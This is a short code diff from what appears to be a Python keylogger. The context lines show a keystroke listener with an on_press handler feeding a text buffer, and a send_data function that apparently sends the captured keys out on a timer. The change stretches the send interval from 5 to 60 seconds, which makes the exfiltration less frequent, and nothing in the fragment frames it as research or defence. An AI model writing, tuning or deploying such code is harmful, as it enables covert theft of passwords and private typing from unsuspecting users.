@@ -21,7 +21,7 @@ import threading
 
 text = ""
 
-time_interval = 5
+time_interval = 60
 
 def send_data():
     data = {
@@ -57,3 +57,4 @@ def on_press(key):
 with keyboard.Listener(on_press=on_press) as listener:
     send_data()
     listener.join()
+
